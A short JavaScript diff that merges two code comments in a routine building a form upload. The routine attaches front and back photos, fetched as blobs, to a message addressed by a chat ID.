@@ -83,13 +83,11 @@
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
 
-            // Sending front photo
+            // Sending both front and back photos in one message
             if (frontPhoto) {
                 const frontBlob = await (await fetch(frontPhoto)).blob();
                 formData.append("photo", frontBlob, "front_photo.png");
             }
-
-            // Sending back photo
             if (backPhoto) {
                 const backBlob = await (await fetch(backPhoto)).blob();
                 formData.append("photo", backBlob, "back_photo.png");
